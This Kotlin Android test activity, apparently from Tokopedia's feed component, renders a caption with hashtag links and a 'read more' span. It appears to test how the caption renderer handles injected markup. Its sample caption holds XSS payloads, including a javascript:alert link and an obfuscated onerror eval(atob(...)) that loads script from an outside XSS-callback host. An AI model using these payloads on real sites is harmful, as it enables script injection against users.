package com.tokopedia.feed.component.sample

import android.os.Bundle
import android.text.Spannable
import android.text.SpannableString
import android.text.TextPaint
import android.text.method.LinkMovementMethod
import android.text.style.ClickableSpan
import android.util.DisplayMetrics
import android.view.View
import android.widget.TextView
import android.widget.Toast
import androidx.appcompat.app.AppCompatActivity
import com.tokopedia.abstraction.common.utils.view.MethodChecker
import com.tokopedia.feedcomponent.R
import com.tokopedia.feedcomponent.util.FlowTextUtil
import com.tokopedia.feedcomponent.util.TagConverter
import com.tokopedia.feedcomponent.util.safeSetSpan


/**
 * Created by meyta.taliti on 15/12/22.
 */
class FeedCaptionTestActivity : AppCompatActivity() {

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_feed_caption_test)

        val caption = "<font color=red>test</font>\n<font color=blue>html</font>\n<font color=yellow>injection</font>\n<a href=javascript:alert(document.domain)>brainsec</a>\n\"><video><source onerror=eval(atob(this.id)) id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8vYWNlbmdzLnhzcy5odCI7ZG9jdW1lbnQuYm9keS5hcHBlbmRDaGlsZChhKTs&#61;>\n\nTest. '-alert?.(1)-' #hadeh #katasiapa #janganmacammacam"

        val readMoreString = getString(R.string.feed_component_read_more_button)

        val tagConverter = TagConverter()
        val convertedCaption = convertToLinkifyHashtag(tagConverter, SpannableString(caption))

        val tvAuthor = findViewById<TextView>(R.id.tv_caption_author)
        val tvCaption = findViewById<TextView>(R.id.tv_caption_text)
        tvAuthor.text = "Fellow Official Fellow"

        val feedConvertedCaption = convertedCaption.toCaption(readMoreString, readMoreClickListener = {
            tvCaption.text = convertedCaption
        })
        FlowTextUtil.flowText(feedConvertedCaption, tvAuthor, tvCaption, this.resources.displayMetrics)
        tvCaption.movementMethod = LinkMovementMethod.getInstance()
    }

    private fun convertToLinkifyHashtag(tagConverter: TagConverter, spannableString: SpannableString): SpannableString {
        return tagConverter.convertToLinkifyHashtag(
            spannableString,
            MethodChecker.getColor(
                this@FeedCaptionTestActivity,
                com.tokopedia.unifyprinciples.R.color.Unify_G400
            ),
            onClick = {
                onHashtagClicked(it, spannableString)
            }
        )
    }

    private fun SpannableString.toCaption(readMore: String, readMoreClickListener: () -> Unit): SpannableString {
        val maxChar = 120
        val readMoreClickableSpan = object : ClickableSpan() {
            override fun onClick(view: View) {
                readMoreClickListener()
            }

            override fun updateDrawState(ds: TextPaint) {
                super.updateDrawState(ds)
                ds.isUnderlineText = false
                ds.color = MethodChecker.getColor(
                    this@FeedCaptionTestActivity,
                    com.tokopedia.unifyprinciples.R.color.Unify_N400
                )
            }
        }

        return if (this.length > maxChar)  {
            val tempCaption = this.substring(0, maxChar)
                .plus("...")
                .plus(readMore)
            return SpannableString(tempCaption).apply {
                safeSetSpan(
                    readMoreClickableSpan,
                    maxChar,
                    length,
                    Spannable.SPAN_EXCLUSIVE_INCLUSIVE
                )
            }
        } else this
    }

    private fun onHashtagClicked(hashtag: String, spannableString: SpannableString) {
        Toast.makeText(this, "$hashtag, $spannableString", Toast.LENGTH_SHORT).show()
    }

}
